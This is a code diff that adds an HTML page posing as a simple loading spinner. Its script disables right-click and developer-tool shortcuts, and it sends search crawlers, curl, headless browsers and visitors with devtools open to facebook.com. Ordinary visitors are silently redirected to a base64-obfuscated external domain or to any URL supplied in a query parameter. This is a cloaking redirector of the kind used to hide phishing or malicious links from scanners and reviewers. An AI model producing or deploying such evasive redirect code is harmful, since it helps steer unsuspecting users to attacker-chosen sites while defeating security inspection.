@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #f0f0f0;
+        }
+        
+        .spinner {
+            width: 80px;
+            height: 80px;
+            position: relative;
+        }
+        
+        .dot {
+            width: 12px;
+            height: 12px;
+            background: #333;
+            border-radius: 50%;
+            position: absolute;
+            animation: circleDot 1.2s infinite ease-in-out;
+        }
+        
+        .dot:nth-child(1) {
+            top: 10px;
+            left: 34px;
+            animation-delay: 0s;
+        }
+        
+        .dot:nth-child(2) {
+            top: 18px;
+            left: 58px;
+            animation-delay: 0.15s;
+        }
+        
+        .dot:nth-child(3) {
+            top: 38px;
+            left: 66px;
+            animation-delay: 0.3s;
+        }
+        
+        .dot:nth-child(4) {
+            top: 58px;
+            left: 58px;
+            animation-delay: 0.45s;
+        }
+        
+        .dot:nth-child(5) {
+            top: 66px;
+            left: 34px;
+            animation-delay: 0.6s;
+        }
+        
+        .dot:nth-child(6) {
+            top: 58px;
+            left: 10px;
+            animation-delay: 0.75s;
+        }
+        
+        .dot:nth-child(7) {
+            top: 38px;
+            left: 2px;
+            animation-delay: 0.9s;
+        }
+        
+        .dot:nth-child(8) {
+            top: 18px;
+            left: 10px;
+            animation-delay: 1.05s;
+        }
+        
+        @keyframes circleDot {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(0.5);
+                opacity: 0.3;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="spinner">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+    </div>
+
+    <script>
+        // Disable right click
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            return false;
+        });
+
+        // Disable F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'J')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // Disable developer tools detection
+        const devtools = { open: false, orientation: null };
+        const threshold = 160;
+
+        setInterval(() => {
+            if (window.outerHeight - window.innerHeight > threshold ||
+                window.outerWidth - window.innerWidth > threshold) {
+                if (!devtools.open) {
+                    devtools.open = true;
+                    window.location.href = 'https://www.facebook.com';
+                }
+            } else {
+                devtools.open = false;
+            }
+        }, 500);
+
+        // Anti curl/headless detection
+        function detectBot() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const botPatterns = [
+                /googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i, /baiduspider/i,
+                /yandexbot/i, /sogou/i, /exabot/i, /facebookexternalhit/i, /twitterbot/i,
+                /linkedinbot/i, /whatsapp/i, /telegram/i, /curl/i, /wget/i,
+                /python/i, /java(?!script)/i, /phantomjs/i, /headlesschrome/i,
+                /puppeteer/i, /selenium/i, /scrapy/i, /bot/i, /crawler/i, /spider/i
+            ];
+            return botPatterns.some(pattern => pattern.test(userAgent));
+        }
+
+        // Check for headless
+        const isHeadless = !window.chrome || navigator.webdriver || navigator.plugins.length === 0;
+
+        function getRedirectUrl() {
+            const params = new URLSearchParams(window.location.search);
+            let encodedUrl = params.get('url');
+            
+            if (!encodedUrl) {
+                encodedUrl = 'aHR0cHM6Ly90ZWtvbi5jeW91L2NvbXQv';
+            }
+            
+            if (encodedUrl) {
+                try {
+                    return atob(encodedUrl);
+                } catch (e) {
+                    return 'https://www.facebook.com';
+                }
+            }
+            return 'https://www.facebook.com';
+        }
+
+        function isValidUrl(string) {
+            try {
+                new URL(string);
+                return true;
+            } catch (_) {
+                return false;
+            }
+        }
+
+        let targetUrl = getRedirectUrl();
+        
+        if (detectBot() || isHeadless) {
+            targetUrl = 'https://www.facebook.com';
+        }
+        
+        if (!targetUrl || !isValidUrl(targetUrl)) {
+            targetUrl = 'https://www.facebook.com';
+        }
+
+        setTimeout(() => {
+            window.location.href = targetUrl;
+        }, 2000);
+    </script>
+</body>
+</html>
